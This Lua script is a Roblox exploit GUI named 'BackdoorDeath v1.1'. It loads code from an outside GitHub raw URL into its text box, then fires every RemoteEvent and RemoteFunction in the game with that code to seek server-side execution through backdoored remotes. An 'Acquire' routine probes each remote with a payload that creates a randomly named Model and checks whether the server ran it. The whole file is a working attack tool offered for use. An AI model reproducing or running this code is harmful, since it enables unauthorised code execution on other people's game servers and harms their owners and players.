game:GetService("ReplicatedStorage").AmbilIkan:Destroy()

print("Backdoor Death // Successfully booted up!")
local function debug(msg)
	if 0 == 1 then 
		game:GetService('TestService'):Message('BackdoorDeath // '..tostring(msg)) -- This is for debugging. 
	end 
end 

-- Create GUI Objects

local ScrnGui = Instance.new("ScreenGui")
local MnPrt = Instance.new("Frame")
local UICorner1 = Instance.new("UICorner")
local UIStroke1 = Instance.new("UIStroke")

local InPrt = Instance.new("Frame")
local UICorner2 = Instance.new("UICorner")
local UIStroke2 = Instance.new("UIStroke")

local Cody = Instance.new("TextBox")
local UICorner3 = Instance.new("UICorner")

local Execy = Instance.new("TextButton")
local UICorner4 = Instance.new("UICorner")

local Acqur = Instance.new("TextButton")
local UICorner5 = Instance.new("UICorner")

local Labely = Instance.new("TextLabel")

-- Set Properties

ScrnGui.Name = "BackdoorDeath"
ScrnGui.Parent = game:GetService("CoreGui")
ScrnGui.ResetOnSpawn = false

-- Main Frame
MnPrt.Name = "MainPart"
MnPrt.Parent = ScrnGui
MnPrt.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MnPrt.Position = UDim2.new(0.5, -180, 0.5, -120)
MnPrt.Size = UDim2.new(0, 360, 0, 240)
MnPrt.Active = true
MnPrt.Draggable = true

UICorner1.Parent = MnPrt

UIStroke1.Parent = MnPrt
UIStroke1.Color = Color3.fromRGB(200, 0, 0)
UIStroke1.Thickness = 2

-- Inner Panel
InPrt.Name = "Inside"
InPrt.Parent = MnPrt
InPrt.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
InPrt.Position = UDim2.new(0, 0, 0, 40)
InPrt.Size = UDim2.new(1, 0, 1, -40)

UICorner2.Parent = InPrt

UIStroke2.Parent = InPrt
UIStroke2.Color = Color3.fromRGB(100, 0, 0)
UIStroke2.Thickness = 1

-- Code TextBox
Cody.Name = "Code"
Cody.Parent = InPrt
Cody.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Cody.Position = UDim2.new(0, 10, 0, 10)
Cody.Size = UDim2.new(1, -20, 0, 120)
Cody.ClearTextOnFocus = false
Cody.MultiLine = true
Cody.Font = Enum.Font.Gotham
Cody.FontSize = Enum.FontSize.Size14
Cody.TextColor3 = Color3.fromRGB(255, 80, 80)
Cody.TextWrapped = true
Cody.TextXAlignment = Enum.TextXAlignment.Left
Cody.TextYAlignment = Enum.TextYAlignment.Top
Cody.Text = game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Death-SS/refs/heads/main/Checker.lua")

UICorner3.Parent = Cody

-- Execute Button
Execy.Name = "Execute"
Execy.Parent = InPrt
Execy.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
Execy.Position = UDim2.new(0, 10, 0, 140)
Execy.Size = UDim2.new(0.5, -15, 0, 35)
Execy.Font = Enum.Font.GothamBold
Execy.FontSize = Enum.FontSize.Size14
Execy.Text = "Execute!"
Execy.TextColor3 = Color3.fromRGB(255, 0, 0)

UICorner4.Parent = Execy

-- Acquire Button
Acqur.Name = "Acquire"
Acqur.Parent = InPrt
Acqur.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
Acqur.Position = UDim2.new(0.5, 5, 0, 140)
Acqur.Size = UDim2.new(0.5, -15, 0, 35)
Acqur.Font = Enum.Font.GothamBold
Acqur.FontSize = Enum.FontSize.Size14
Acqur.Text = "Acquire!"
Acqur.TextColor3 = Color3.fromRGB(255, 0, 0)

UICorner5.Parent = Acqur

-- Title Label
Labely.Name = "Title"
Labely.Parent = MnPrt
Labely.BackgroundTransparency = 1
Labely.Position = UDim2.new(0, 0, 0, 0)
Labely.Size = UDim2.new(1, 0, 0, 40)
Labely.Font = Enum.Font.GothamSemibold
Labely.Text = "BackdoorDeath v1.1"
Labely.TextColor3 = Color3.fromRGB(255, 0, 0)
Labely.TextSize = 18
Labely.TextStrokeTransparency = 0.8

-- Add functionalities!

local AcquiredRemote = nil 
local IsAcquiring = false 

Execy.MouseButton1Click:Connect(function()
	-- Fetch code from TextBox.
	local CodeStr = Cody.Text
	local InvokeFunc = Instance.new("BindableEvent")
	InvokeFunc.Event:Connect(function(rfunc,codestr2)
		-- This invokes the RemoteFunction without waiting.
		rfunc:InvokeServer(codestr2)
	end)
	local function DeepFire(inst)
		if not IsAcquiring then 
			if AcquiredRemote == nil then 
				-- Search every descendant of DataModel.
				for _, childy in inst:GetChildren() do
					-- We don't want remotes from RobloxReplicatedStorage!
					if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
						-- Check the class of the descendant.
						if childy:IsA("RemoteEvent") then
							-- If it is a RemoteEvent, fire it with code!
							print("Backdoor Death // Running "..childy.ClassName..' "'..childy.Name..'".')
							childy:FireServer(CodeStr)
						elseif childy:IsA("RemoteFunction") then
							-- Else if it is a RemoteFunction, invoke it with code!
							print("Backdoor Death // Running "..childy.ClassName..' "'..childy.Name..'".')
							InvokeFunc:Fire(childy, CodeStr)
						end
					end
					-- Keep looping through descendants, until dead end.
					DeepFire(childy)
				end 
			else 
				if AcquiredRemote:IsA("RemoteEvent") then 
					AcquiredRemote:FireServer(CodeStr) 
				elseif AcquiredRemote:IsA("RemoteFunction") then 
					task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
				end
			end 
		end
	end
	-- Call the function!
	warn("Backdoor Death // Running all remotes with code:\n"..CodeStr)
	DeepFire(game)
end)

-- While making this acquire feature, my brain almost exploded.

Acqur.MouseButton1Click:Connect(function() 
	local RemoteList = {} 
	local CurrentRemote = nil 
	local isFound = false
	if not IsAcquiring then 
		IsAcquiring = true 
		warn('BackdoorDeath // Scanning Started!') 
		Cody.Text = '-- Please wait, while we are scanning the remotes.'
		for i,v in pairs(game:GetDescendants()) do 
			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
					table.insert(RemoteList,v) 
				end 
			end
		end 
		for a,b in pairs(RemoteList) do
			if AcquiredRemote == nil then 
				print("BackdoorDeath // Checking "..b.ClassName..' "'..b.Name..'".') 
				local NeededNameOfModel = string.char(
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A),
					math.random(0x0041,0x005A),math.random(0x0041,0x005A)
				)
				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
				CurrentRemote = b 
				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
					if b:IsA('RemoteEvent') then 
						debug('Fired')
						b:FireServer(NeededCode) 
					elseif b:IsA('RemoteFunction') then 
						debug('Invoked')
						task.spawn(function() b:InvokeServer(NeededCode) end) 
					end 
				end 
				debug('Awaiting')
				wait(2.5) 
				if workspace:FindFirstChild(NeededNameOfModel) then 
					debug('Detected')
					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
						debug('Success')
						AcquiredRemote = b
					end 
				end 
			end 
		end 	
		if AcquiredRemote ~= nil then 
			isFound = true 
			Cody.Text = '-- Remote acquired! :D' 
			warn('BackdoorDeath // Remote acquired! :D')
		else 
			isFound = false 
			Cody.Text = '-- Not found. :(' 
			warn('BackdoorDeath // Not found. :(')
		end 
		IsAcquiring = false 
	end 
end)
